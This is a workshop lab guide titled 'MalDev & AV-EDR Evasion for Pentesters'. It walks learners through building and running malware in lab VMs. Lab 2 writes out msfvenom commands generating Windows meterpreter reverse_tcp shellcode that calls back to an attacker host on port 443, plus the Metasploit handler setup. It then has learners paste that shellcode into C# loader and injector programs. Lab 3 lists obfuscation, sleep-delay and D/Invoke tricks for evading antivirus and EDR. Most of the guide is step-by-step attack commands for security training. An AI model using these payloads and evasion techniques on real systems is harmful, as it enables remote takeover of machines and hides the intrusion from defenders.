# MalDev & AV-EDR Evasion for Pentesters Lab Guide

## Lab 0 - Environment Setup

VMs will be provided along with the workshop

## Lab 1 - C# Basics

- **Exercise 1: HelloWorld**

	1. Go to "Testing/Lab 1 - C# Basics" folder in Desktop.
	2. Right-click with the mouse, and "Open in Terminal Preview"
	3. `csc.exe 1-HelloWorld.cs /unsafe`
	4. Execute 1-HelloWorld.exe

- **Exercise 2: MessageBox**

	1. Go to "Testing/Lab 1 - C# Basics" folder in Desktop.
	2. Right-click with the mouse, and "Open in Terminal Preview"
	3. `csc.exe 2-MessageBox.cs /unsafe`
	4. Execute 2-MessageBox.exe

## Lab 2 - Shellcoding

- **Exercise 1: Generate shellcode with msfvenom**

	1. In the Kali VM, open a new terminal:
	```
	[create new folder called "testing" and move to that folder]
	mkdir testing
	cd testing
	
	[identify eth0 network interface ip address]
	ifconfig
	ip addr

	[generate raw meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f raw -o met.bin
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f raw -o met.bin
	
	[generate raw hex meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f hex -o met.hex
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f hex -o met.hex
	cat met.hex
	
	[generate csharp meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f csharp -o met.cs
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f csharp -o met.cs
	cat met.cs
	
	[generate exe meterpreter staged shellcode]
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[eth0 IP ADDRESS] LPORT=[PORT] EXITFUNC=thread -f exe -o met.exe
	msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.100.133 LPORT=443 EXITFUNC=thread -f exe -o met.exe

	[in the same folder, start an HTTP server to file sharing]
	python3 -m http.server
	```

	2. In a different console tab or window, in the Kali VM:

	```
	sudo msfconsole
	use exploit/multi/handler
	set payload windows/x64/meterpreter/reverse_tcp
	set LHOST [eth0 IP ADDRESS]
	set LHOST 192.168.100.133
	set LPORT [PORT]
	set LPORT 443
	set exitonsession false
	set enablestageencoding true
	set exitfunc thread
	run -j
	```

	3. In the Windows 10 Development Host:

	- Verify Defender is disabled
	- Open Chrome, access to http://192.168.100.133:8000
	- Dowload met.exe, click on "Keep dangerous file", click on "Keep anyway", click "Run..."
	- Execute met.exe file

- **Exercise 2: Basic shellcode loader**

	1. Verify Defender is disabled
	2. Go to "Testing/Lab 2 - Simple Shellcode Runner" folder in Desktop.
	3. Double-click with the mouse on the 2-BasicShellcodeLoader.cs file
	4. Replace "// CODE" line with the C# byte array generated with msfvenom as met.cs, save the changes, close
	5. Right-click with the mouse in the "Testing/Lab 2 - Simple Shellcode Runner" folder, and "Open in Terminal Preview"
	6. `csc.exe 2-BasicShellcodeLoader.cs /unsafe`
	7. Execute 2-BasicShellcodeLoader.exe
	8. Verify meterpreter new incoming session on Kali VM

- **Exercise 3: Basic shellcode injector**

	1. Verify Defender is disabled
	2. Go to "Testing/Lab 2 - Simple Shellcode Runner" folder in Desktop.
	3. Double-click with the mouse on the 3-BasicShellcodeInjector.cs file
	4. Replace "// CODE" line with the C# byte array generated with msfvenom as met.cs, save the changes, close
	5. Right-click with the mouse in the "Testing/Lab 2 - Simple Shellcode Runner" folder, and "Open in Terminal Preview"
	6. `csc.exe 3-BasicShellcodeInjector.cs /unsafe`
	7. Execute 3-BasicShellcodeInjector.exe
	8. Verify meterpreter new incoming session on Kali VM
	
## Lab 3 - AV-EDR Evasion

- **Exercise 1: AV evasion with strings and shellcode obfuscation**
	- `csc.exe 1-BasicShellcodeInjector.cs /unsafe`
	
- **Exercise 2: AV evasion with obfuscation and sleep delay**
	- `csc.exe 2-BasicShellcodeInjectorwithSleep.cs /unsafe`

- **Exercise 3: Modifying behavior**
	- In multi/handler: `set autoloadstdapi false`
	- In meterpreter, after a minute: `load stdapi`

- **Exercise 4: EDR evasion with D/Invoke**
	- `csc.exe 4-BasicShellcodeInjectorwithSleep(DInvoke).cs /unsafe`